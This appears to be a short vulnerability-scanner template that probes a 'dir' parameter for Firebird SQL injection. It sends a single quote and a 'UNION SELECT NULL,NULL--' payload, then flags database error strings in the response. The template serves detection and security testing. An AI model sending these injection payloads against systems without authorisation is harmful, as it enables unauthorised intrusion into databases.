id: sqli2-firebird-13
name: 'SQLi error firebird via dir'
severity: high
type: active
tags:
  - sqli
  - injection
  - firebird
description: 'Triggers firebird error via dir'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      dir:
        - ''''
        - ''' UNION SELECT NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Firebird'
          - 'Dynamic SQL Error'
